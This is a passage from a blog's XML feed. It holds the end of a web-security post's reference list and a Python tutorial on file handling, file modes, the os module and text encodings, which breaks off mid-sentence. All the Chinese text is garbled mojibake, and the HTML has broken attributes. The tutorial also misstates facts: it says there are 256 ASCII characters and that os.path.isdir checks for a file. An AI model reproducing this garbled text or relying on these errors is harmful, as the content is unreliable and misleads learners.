type="1"><li><ahref="https://zhuanlan.zhihu.com/p/41377443">å®‰å…¨è®¾è®¡çš„ä¸€äº›å®è·µ</a></li><li>ã€Šæ•°æ®å®‰å…¨æ¶æ„è®¾è®¡ä¸å®æˆ˜ã€‹</li><li><ahref="https://cloud.tencent.com/developer/article/1099266">æƒé™æ§åˆ¶çš„è§£å†³æ–¹å¼(ç§‘æ™®å‘)</a></li><li><ahref="https://cloud.tencent.com/developer/article/1367399">ä¸šåŠ¡é€»è¾‘æ¼æ´æ¢ç´¢ä¹‹è¶Šæƒæ¼æ´</a></li></ol></blockquote><h1 id="ä¹Œäº‘é•œåƒ">ä¹Œäº‘é•œåƒ</h1><p><a href="http://wy.zone.ci">é•œåƒ 1</a> <a href="http://xss.one/">é•œåƒ2</a> <a href="http://www.onebug.org">é•œåƒ 3</a> <ahref="https://www.madebug.net/">é•œåƒ 4</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> logic_vuln </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python æ–‡ä»¶æ“ä½œåŸºç¡€</title>
      <link href="/blog/2020/03/22/programming/python/2.object-oriented/file_basic/"/>
      <url>/blog/2020/03/22/programming/python/2.object-oriented/file_basic/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–‡ä»¶çš„æ¦‚å¿µ">æ–‡ä»¶çš„æ¦‚å¿µ</h2><h3 id="æ–‡ä»¶çš„æ¦‚å¿µå’Œä½œç”¨">1.1 æ–‡ä»¶çš„æ¦‚å¿µå’Œä½œç”¨</h3><ul><li>è®¡ç®—æœºçš„ <strong>æ–‡ä»¶</strong>ï¼Œå°±æ˜¯å­˜å‚¨åœ¨æŸç§<strong>é•¿æœŸå‚¨å­˜è®¾å¤‡</strong> ä¸Šçš„ä¸€æ®µ <strong>æ•°æ®</strong></li><li>é•¿æœŸå­˜å‚¨è®¾å¤‡åŒ…æ‹¬ï¼šç¡¬ç›˜ã€U ç›˜ã€ç§»åŠ¨ç¡¬ç›˜ã€å…‰ç›˜...</li></ul><p>æ–‡ä»¶çš„ä½œç”¨: å°†æ•°æ®é•¿æœŸä¿å­˜ä¸‹æ¥ï¼Œåœ¨éœ€è¦çš„æ—¶å€™ä½¿ç”¨</p><h3 id="æ–‡ä»¶çš„å­˜å‚¨æ–¹å¼">æ–‡ä»¶çš„å­˜å‚¨æ–¹å¼</h3><ul><li>åœ¨è®¡ç®—æœºä¸­ï¼Œæ–‡ä»¶æ˜¯ä»¥ <strong>äºŒè¿›åˆ¶</strong>çš„æ–¹å¼ä¿å­˜åœ¨ç£ç›˜ä¸Šçš„</li></ul><h4 id="æ–‡æœ¬æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ–‡ä»¶">æ–‡æœ¬æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ–‡ä»¶</h4><ul><li>æ–‡æœ¬æ–‡ä»¶<ul><li>å¯ä»¥ä½¿ç”¨ <strong>æ–‡æœ¬ç¼–è¾‘è½¯ä»¶</strong> æŸ¥çœ‹</li><li>æœ¬è´¨ä¸Šè¿˜æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶</li><li>ä¾‹å¦‚ï¼špython çš„æºç¨‹åº</li></ul></li><li>äºŒè¿›åˆ¶æ–‡ä»¶<ul><li>ä¿å­˜çš„å†…å®¹ ä¸æ˜¯ç»™äººç›´æ¥é˜…è¯»çš„ï¼Œè€Œæ˜¯<strong>æä¾›ç»™å…¶ä»–è½¯ä»¶ä½¿ç”¨çš„</strong></li><li>ä¾‹å¦‚ï¼šå›¾ç‰‡æ–‡ä»¶ã€éŸ³é¢‘æ–‡ä»¶ã€è§†é¢‘æ–‡ä»¶ç­‰ç­‰</li><li>äºŒè¿›åˆ¶æ–‡ä»¶ä¸èƒ½ä½¿ç”¨ <strong>æ–‡æœ¬ç¼–è¾‘è½¯ä»¶</strong> æŸ¥çœ‹</li></ul></li></ul><h2 id="æ–‡ä»¶çš„åŸºæœ¬æ“ä½œ">02. æ–‡ä»¶çš„åŸºæœ¬æ“ä½œ</h2><h3 id="æ“ä½œæ–‡ä»¶çš„å¥—è·¯">2.1 æ“ä½œæ–‡ä»¶çš„å¥—è·¯</h3><p>åœ¨ <strong>è®¡ç®—æœº</strong>ä¸­è¦æ“ä½œæ–‡ä»¶çš„å¥—è·¯éå¸¸å›ºå®šï¼Œä¸€å…±åŒ…å«<strong>ä¸‰ä¸ªæ­¥éª¤</strong>ï¼š</p><ol type="1"><li>æ‰“å¼€æ–‡ä»¶</li><li>è¯»ã€å†™æ–‡ä»¶<ul><li><strong>è¯»</strong> å°†æ–‡ä»¶å†…å®¹è¯»å…¥å†…å­˜</li><li><strong>å†™</strong> å°†å†…å­˜å†…å®¹å†™å…¥æ–‡ä»¶</li></ul></li><li>å…³é—­æ–‡ä»¶</li></ol><h3 id="æ“ä½œæ–‡ä»¶çš„å‡½æ•°æ–¹æ³•">2.2 æ“ä½œæ–‡ä»¶çš„å‡½æ•°/æ–¹æ³•</h3><ul><li>åœ¨ <code>Python</code> ä¸­è¦æ“ä½œæ–‡ä»¶éœ€è¦è®°ä½ 1 ä¸ªå‡½æ•°å’Œ 3 ä¸ªæ–¹æ³•</li></ul><table><thead><tr class="header"><th style="text-align: left;">åºå·</th><th style="text-align: left;">å‡½æ•°/æ–¹æ³•</th><th style="text-align: left;">è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">01</td><td style="text-align: left;">open</td><td style="text-align: left;">æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä¸”è¿”å›æ–‡ä»¶æ“ä½œå¯¹è±¡</td></tr><tr class="even"><td style="text-align: left;">02</td><td style="text-align: left;">read</td><td style="text-align: left;">å°†æ–‡ä»¶å†…å®¹è¯»å–åˆ°å†…å­˜</td></tr><tr class="odd"><td style="text-align: left;">03</td><td style="text-align: left;">write</td><td style="text-align: left;">å°†æŒ‡å®šå†…å®¹å†™å…¥æ–‡ä»¶</td></tr><tr class="even"><td style="text-align: left;">04</td><td style="text-align: left;">close</td><td style="text-align: left;">å…³é—­æ–‡ä»¶</td></tr></tbody></table><ul><li><code>open</code> å‡½æ•°è´Ÿè´£æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä¸”è¿”å›æ–‡ä»¶å¯¹è±¡</li><li><code>read</code>/<code>write</code>/<code>close</code>ä¸‰ä¸ªæ–¹æ³•éƒ½éœ€è¦é€šè¿‡ <strong>æ–‡ä»¶å¯¹è±¡</strong> æ¥è°ƒç”¨</li></ul><h3 id="read-æ–¹æ³•-è¯»å–æ–‡ä»¶">2.3 read æ–¹æ³• â€”â€” è¯»å–æ–‡ä»¶</h3><p>Python file method <strong>read()</strong> reads at most<em>size</em> bytes from the file. If the read hits EOF before obtainingsize bytes, then it reads only available bytes.</p><p>Following is the syntax for <strong>read()</strong> method âˆ’</p><blockquote><p>fileObject.read( size );</p></blockquote><p><strong>Parameters</strong></p><ul><li><strong>size</strong> âˆ’ This is the number of bytes to be read fromthe file.</li></ul><p><strong>Return Value</strong></p><p>This method returns the bytes read in string.</p><p>å³ï¼šread æœ‰ä¸€ä¸ªå¯é€‰å‚æ•°ï¼šè¯»å–çš„å­—ç¬¦ä¸ªæ•°ï¼Œå¦‚æœä¸å†™ï¼Œé»˜è®¤è¯»å–åˆ° EOFæˆªæ­¢ã€‚è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒ…å«è¯»å–çš„å†…å®¹ï¼‰</p><ul><li><p><strong>openå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦æ‰“å¼€çš„æ–‡ä»¶åï¼ˆæ–‡ä»¶ååŒºåˆ†å¤§å°å†™ï¼‰</strong></p><p>å¯¹äºè¯»å–æ¨¡å¼ r æ¥è¯´ï¼Œ</p><ul><li>å¦‚æœæ–‡ä»¶ <strong>å­˜åœ¨</strong>ï¼Œè¿”å›<strong>æ–‡ä»¶æ“ä½œå¯¹è±¡</strong></li><li>å¦‚æœæ–‡ä»¶ <strong>ä¸å­˜åœ¨</strong>ï¼Œä¼š <strong>æŠ›å‡ºå¼‚å¸¸</strong></li></ul><p>è€Œå¯¹äºå†™æ¨¡å¼ w ä¸è¿½åŠ æ¨¡å¼ aæ¥è¯´ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šæ–°å»ºæ–‡ä»¶ï¼Œå¹¶ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p></li><li><p><code>read</code> æ–¹æ³•å¯ä»¥ä¸€æ¬¡æ€§ <strong>è¯»å…¥</strong> å¹¶<strong>è¿”å›</strong> æ–‡ä»¶çš„ <strong>æ‰€æœ‰å†…å®¹</strong></p></li><li><p>close æ–¹æ³•è´Ÿè´£å…³é—­æ–‡ä»¶</p><ul><li>å¦‚æœ<strong>å¿˜è®°å…³é—­æ–‡ä»¶</strong>ï¼Œ<strong>ä¼šé€ æˆç³»ç»Ÿèµ„æºæ¶ˆè€—ï¼Œè€Œä¸”ä¼šå½±å“åˆ°åç»­å¯¹æ–‡ä»¶çš„è®¿é—®</strong></li></ul></li><li><p><strong>æ³¨æ„</strong>ï¼š<code>read</code> æ–¹æ³•æ‰§è¡Œåï¼Œä¼šæŠŠ<strong>æ–‡ä»¶æŒ‡é’ˆ</strong> ç§»åŠ¨åˆ° <strong>æ–‡ä»¶çš„æœ«å°¾</strong></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. æ‰“å¼€ - æ–‡ä»¶åéœ€è¦æ³¨æ„å¤§å°å†™</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. è¯»å–</span></span><br><span class="line">text = file.read()</span><br><span class="line"><span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. å…³é—­</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p><strong>æç¤º</strong></p><ul><li>åœ¨å¼€å‘ä¸­ï¼Œé€šå¸¸ä¼šå…ˆç¼–å†™ <strong>æ‰“å¼€</strong> å’Œ<strong>å…³é—­</strong> çš„ä»£ç ï¼Œå†ç¼–å†™ä¸­é—´é’ˆå¯¹æ–‡ä»¶çš„<strong>è¯»/å†™</strong> æ“ä½œï¼</li></ul><h4 id="æ–‡ä»¶æŒ‡é’ˆçŸ¥é“">æ–‡ä»¶æŒ‡é’ˆï¼ˆçŸ¥é“ï¼‰</h4><ul><li><strong>æ–‡ä»¶æŒ‡é’ˆ</strong> æ ‡è®°<strong>ä»å“ªä¸ªä½ç½®å¼€å§‹è¯»å–æ•°æ®</strong></li><li><strong>ç¬¬ä¸€æ¬¡æ‰“å¼€</strong> æ–‡ä»¶æ—¶ï¼Œé€šå¸¸<strong>æ–‡ä»¶æŒ‡é’ˆä¼šæŒ‡å‘æ–‡ä»¶çš„å¼€å§‹ä½ç½®</strong>(å¦‚æœä»¥è¿½åŠ æ–¹å¼æ‰“å¼€ï¼Œæ–‡ä»¶æŒ‡é’ˆåœ¨æœ«å°¾)</li><li>å½“æ‰§è¡Œäº† read æ–¹æ³•åï¼Œæ–‡ä»¶æŒ‡é’ˆä¼šç§»åŠ¨åˆ°è¯»å–å†…å®¹çš„æœ«å°¾<ul><li>é»˜è®¤æƒ…å†µä¸‹ä¼šç§»åŠ¨åˆ° <strong>æ–‡ä»¶æœ«å°¾</strong></li></ul></li></ul><p><strong>æ€è€ƒ</strong></p><ul><li>å¦‚æœæ‰§è¡Œäº†ä¸€æ¬¡ <code>read</code> æ–¹æ³•ï¼Œè¯»å–äº†æ‰€æœ‰å†…å®¹ï¼Œé‚£ä¹ˆå†æ¬¡è°ƒç”¨<code>read</code> æ–¹æ³•ï¼Œè¿˜èƒ½å¤Ÿè·å¾—åˆ°å†…å®¹å—ï¼Ÿ</li></ul><p><strong>ç­”æ¡ˆ</strong></p><ul><li>ä¸èƒ½</li><li>ç¬¬ä¸€æ¬¡è¯»å–ä¹‹åï¼Œæ–‡ä»¶æŒ‡é’ˆç§»åŠ¨åˆ°äº†æ–‡ä»¶æœ«å°¾ï¼Œå†æ¬¡è°ƒç”¨ä¸ä¼šè¯»å–åˆ°ä»»ä½•çš„å†…å®¹</li></ul><h3 id="æ‰“å¼€æ–‡ä»¶çš„æ–¹å¼">2.4 æ‰“å¼€æ–‡ä»¶çš„æ–¹å¼</h3><ul><li><code>open</code> å‡½æ•°é»˜è®¤ä»¥ <strong>åªè¯»æ–¹å¼</strong>æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä¸”è¿”å›æ–‡ä»¶å¯¹è±¡</li></ul><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;æ–‡ä»¶å&quot;</span>, <span class="string">&quot;è®¿é—®æ–¹å¼&quot;</span>)</span><br></pre></td></tr></table></figure><table><colgroup><col style="width: 7%" /><col style="width: 92%" /></colgroup><thead><tr class="header"><th style="text-align: center;">è®¿é—®æ–¹å¼</th><th style="text-align: left;">è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">r</td><tdstyle="text-align: left;">ä»¥<strong>åªè¯»</strong>æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ï¼Œè¿™æ˜¯<strong>é»˜è®¤æ¨¡å¼</strong>ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼ŒæŠ›å‡ºå¼‚å¸¸</td></tr><tr class="even"><td style="text-align: center;">w</td><tdstyle="text-align: left;">ä»¥<strong>åªå†™</strong>æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨ä¼šè¢«è¦†ç›–ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶</td></tr><tr class="odd"><td style="text-align: center;">a</td><tdstyle="text-align: left;">ä»¥<strong>è¿½åŠ </strong>æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥</td></tr><tr class="even"><td style="text-align: center;">r+</td><tdstyle="text-align: left;">ä»¥<strong>è¯»å†™</strong>æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶çš„æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„å¼€å¤´ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼ŒæŠ›å‡ºå¼‚å¸¸</td></tr><tr class="odd"><td style="text-align: center;">w+</td><tdstyle="text-align: left;">ä»¥<strong>è¯»å†™</strong>æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨ä¼šè¢«è¦†ç›–ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶</td></tr><tr class="even"><td style="text-align: center;">a+</td><tdstyle="text-align: left;">ä»¥<strong>è¯»å†™</strong>æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥</td></tr></tbody></table><p><strong>æç¤º</strong></p><ul><li>é¢‘ç¹çš„ç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆï¼Œ<strong>ä¼šå½±å“æ–‡ä»¶çš„è¯»å†™æ•ˆç‡</strong>ï¼Œå¼€å‘ä¸­æ›´å¤šçš„æ—¶å€™ä¼šä»¥<strong>åªè¯»</strong>ã€<strong>åªå†™</strong> çš„æ–¹å¼æ¥æ“ä½œæ–‡ä»¶</li></ul><p><strong>å†™å…¥æ–‡ä»¶ç¤ºä¾‹</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">f.write(<span class="string">&quot;hello pythonï¼\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;ä»Šå¤©å¤©æ°”çœŸå¥½&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­æ–‡ä»¶</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="æŒ‰è¡Œè¯»å–æ–‡ä»¶å†…å®¹">2.5 æŒ‰è¡Œè¯»å–æ–‡ä»¶å†…å®¹</h3><ul><li><code>read</code> æ–¹æ³•é»˜è®¤ä¼šæŠŠæ–‡ä»¶çš„ <strong>æ‰€æœ‰å†…å®¹</strong><strong>ä¸€æ¬¡æ€§è¯»å–åˆ°å†…å­˜</strong></li><li>å¦‚æœæ–‡ä»¶å¤ªå¤§ï¼Œå¯¹å†…å­˜çš„å ç”¨ä¼šéå¸¸ä¸¥é‡</li></ul><h4 id="readline-æ–¹æ³•"><code>readline</code> æ–¹æ³•</h4><ul><li><code>readline</code> æ–¹æ³•å¯ä»¥ä¸€æ¬¡è¯»å–ä¸€è¡Œå†…å®¹</li><li>æ–¹æ³•æ‰§è¡Œåï¼Œä¼šæŠŠ <strong>æ–‡ä»¶æŒ‡é’ˆ</strong>ç§»åŠ¨åˆ°ä¸‹ä¸€è¡Œï¼Œå‡†å¤‡å†æ¬¡è¯»å–</li></ul><p><strong>è¯»å–å¤§æ–‡ä»¶çš„æ­£ç¡®å§¿åŠ¿</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># è¯»å–ä¸€è¡Œå†…å®¹</span></span><br><span class="line">    text = file.readline()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ¤æ–­æ˜¯å¦è¯»åˆ°å†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ¯è¯»å–ä¸€è¡Œçš„æœ«å°¾å·²ç»æœ‰äº†ä¸€ä¸ª `\n`</span></span><br><span class="line">    <span class="built_in">print</span>(text, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­æ–‡ä»¶</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶è¯»å†™æ¡ˆä¾‹-å¤åˆ¶æ–‡ä»¶">2.6 æ–‡ä»¶è¯»å†™æ¡ˆä¾‹ â€”â€” å¤åˆ¶æ–‡ä»¶</h3><p><strong>ç›®æ ‡</strong></p><p>ç”¨ä»£ç çš„æ–¹å¼ï¼Œæ¥å®ç°æ–‡ä»¶å¤åˆ¶è¿‡ç¨‹</p><h4 id="å°æ–‡ä»¶å¤åˆ¶">å°æ–‡ä»¶å¤åˆ¶</h4><p>å¯¹äºå°æ–‡ä»¶è¯»å–æ¥è¯´ï¼Œä½¿ç”¨ read å³å¯</p><ul><li>æ‰“å¼€ä¸€ä¸ªå·²æœ‰æ–‡ä»¶ï¼Œè¯»å–å®Œæ•´å†…å®¹ï¼Œå¹¶å†™å…¥åˆ°å¦å¤–ä¸€ä¸ªæ–‡ä»¶</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">file_read = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>)</span><br><span class="line">file_write = <span class="built_in">open</span>(<span class="string">&quot;README[å¤ä»¶]&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. è¯»å–å¹¶å†™å…¥æ–‡ä»¶</span></span><br><span class="line">text = file_read.read()</span><br><span class="line">file_write.write(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. å…³é—­æ–‡ä»¶</span></span><br><span class="line">file_read.close()</span><br><span class="line">file_write.close()</span><br></pre></td></tr></table></figure><h4 id="å¤§æ–‡ä»¶å¤åˆ¶">å¤§æ–‡ä»¶å¤åˆ¶</h4><p>å¤§æ–‡ä»¶è¯»å–ï¼Œéœ€è¦ä½¿ç”¨ readlineï¼Œread ä¸€æ¬¡è¯»å…¥å…¨éƒ¨ï¼Œå†…å­˜å ç”¨è¿‡å¤§</p><ul><li>æ‰“å¼€ä¸€ä¸ªå·²æœ‰æ–‡ä»¶ï¼Œé€è¡Œè¯»å–å†…å®¹ï¼Œå¹¶é¡ºåºå†™å…¥åˆ°å¦å¤–ä¸€ä¸ªæ–‡ä»¶</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">file_read = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>)</span><br><span class="line">file_write = <span class="built_in">open</span>(<span class="string">&quot;README[å¤ä»¶]&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. è¯»å–å¹¶å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># æ¯æ¬¡è¯»å–ä¸€è¡Œ</span></span><br><span class="line">    text = file_read.readline()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ¤æ–­æ˜¯å¦è¯»å–åˆ°å†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    file_write.write(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. å…³é—­æ–‡ä»¶</span></span><br><span class="line">file_read.close()</span><br><span class="line">file_write.close()</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶ç›®å½•çš„å¸¸ç”¨ç®¡ç†æ“ä½œ">03. æ–‡ä»¶/ç›®å½•çš„å¸¸ç”¨ç®¡ç†æ“ä½œ</h2><ul><li>åœ¨ç»ˆç«¯/æ–‡ä»¶æµè§ˆå™¨ä¸­å¯ä»¥æ‰§è¡Œå¸¸è§„çš„æ–‡ä»¶/ç›®å½•ç®¡ç†æ“ä½œï¼Œä¾‹å¦‚ï¼š<ul><li>åˆ›å»ºã€é‡å‘½åã€åˆ é™¤ã€æ”¹å˜è·¯å¾„ã€æŸ¥çœ‹ç›®å½•å†…å®¹ã€â€¦â€¦</li></ul></li><li>åœ¨ <code>Python</code> ä¸­ï¼Œå¦‚æœå¸Œæœ›é€šè¿‡ç¨‹åºå®ç°ä¸Šè¿°åŠŸèƒ½ï¼Œéœ€è¦å¯¼å…¥<code>os</code> æ¨¡å—</li></ul><h3 id="æ–‡ä»¶æ“ä½œ">æ–‡ä»¶æ“ä½œ</h3><table><thead><tr class="header"><th style="text-align: left;">åºå·</th><th style="text-align: left;">æ–¹æ³•å</th><th style="text-align: left;">è¯´æ˜</th><th style="text-align: left;">ç¤ºä¾‹</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">01</td><td style="text-align: left;">rename</td><td style="text-align: left;">é‡å‘½åæ–‡ä»¶</td><tdstyle="text-align: left;"><code>os.rename(æºæ–‡ä»¶å, ç›®æ ‡æ–‡ä»¶å)</code></td></tr><tr class="even"><td style="text-align: left;">02</td><td style="text-align: left;">remove</td><td style="text-align: left;">åˆ é™¤æ–‡ä»¶</td><td style="text-align: left;"><code>os.remove(æ–‡ä»¶å)</code></td></tr></tbody></table><h3 id="ç›®å½•æ“ä½œ">ç›®å½•æ“ä½œ</h3><table><thead><tr class="header"><th style="text-align: left;">åºå·</th><th style="text-align: left;">æ–¹æ³•å</th><th style="text-align: left;">è¯´æ˜</th><th style="text-align: left;">ç¤ºä¾‹</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">01</td><td style="text-align: left;">listdir</td><td style="text-align: left;">ç›®å½•åˆ—è¡¨</td><td style="text-align: left;"><code>os.listdir(ç›®å½•å)</code></td></tr><tr class="even"><td style="text-align: left;">02</td><td style="text-align: left;">mkdir</td><td style="text-align: left;">åˆ›å»ºç›®å½•</td><td style="text-align: left;"><code>os.mkdir(ç›®å½•å)</code></td></tr><tr class="odd"><td style="text-align: left;">03</td><td style="text-align: left;">rmdir</td><td style="text-align: left;">åˆ é™¤ç›®å½•</td><td style="text-align: left;"><code>os.rmdir(ç›®å½•å)</code></td></tr><tr class="even"><td style="text-align: left;">04</td><td style="text-align: left;">getcwd</td><td style="text-align: left;">è·å–å½“å‰ç›®å½•</td><td style="text-align: left;"><code>os.getcwd()</code></td></tr><tr class="odd"><td style="text-align: left;">05</td><td style="text-align: left;">chdir</td><td style="text-align: left;">ä¿®æ”¹å·¥ä½œç›®å½•</td><td style="text-align: left;"><code>os.chdir(ç›®æ ‡ç›®å½•)</code></td></tr><tr class="even"><td style="text-align: left;">06</td><td style="text-align: left;">path.isdir</td><td style="text-align: left;">åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶</td><td style="text-align: left;"><code>os.path.isdir(æ–‡ä»¶è·¯å¾„)</code></td></tr></tbody></table><blockquote><p>æç¤ºï¼šæ–‡ä»¶æˆ–è€…ç›®å½•æ“ä½œéƒ½æ”¯æŒ <strong>ç›¸å¯¹è·¯å¾„</strong> å’Œ<strong>ç»å¯¹è·¯å¾„</strong></p></blockquote><h2 id="æ–‡æœ¬æ–‡ä»¶çš„ç¼–ç æ ¼å¼ç§‘æ™®">04. æ–‡æœ¬æ–‡ä»¶çš„ç¼–ç æ ¼å¼ï¼ˆç§‘æ™®ï¼‰</h2><ul><li>æ–‡æœ¬æ–‡ä»¶å­˜å‚¨çš„å†…å®¹æ˜¯åŸºäº <strong>å­—ç¬¦ç¼–ç </strong>çš„æ–‡ä»¶ï¼Œå¸¸è§çš„ç¼–ç æœ‰ <code>ASCII</code> ç¼–ç ï¼Œ<code>UNICODE</code>ç¼–ç ç­‰</li></ul><blockquote><p>Python 2.x é»˜è®¤ä½¿ç”¨ <code>ASCII</code> ç¼–ç æ ¼å¼ Python 3.x é»˜è®¤ä½¿ç”¨<code>UTF-8</code> ç¼–ç æ ¼å¼</p></blockquote><h3 id="ascii-ç¼–ç å’Œ-unicode-ç¼–ç ">4.1 ASCII ç¼–ç å’Œ UNICODE ç¼–ç </h3><h4 id="ascii-ç¼–ç "><code>ASCII</code> ç¼–ç </h4><ul><li>è®¡ç®—æœºä¸­åªæœ‰ <code>256</code> ä¸ª <code>ASCII</code> å­—ç¬¦</li><li>ä¸€ä¸ª ASCII åœ¨å†…å­˜ä¸­å ç”¨ 1 ä¸ªå­—èŠ‚çš„ç©ºé—´<ul><li><code>8</code> ä¸ª <code>0/1</code> çš„æ’åˆ—ç»„åˆæ–¹å¼ä¸€å…±æœ‰<code>256</code> ç§ï¼Œä¹Ÿå°±æ˜¯ <code>2 ** 8</code></li></ul></li></ul><h4 id="utf-8-ç¼–ç æ ¼å¼"><code>UTF-8</code> ç¼–ç æ ¼å¼</h4><ul><li>è®¡ç®—æœºä¸­ä½¿ç”¨ <strong>1~6 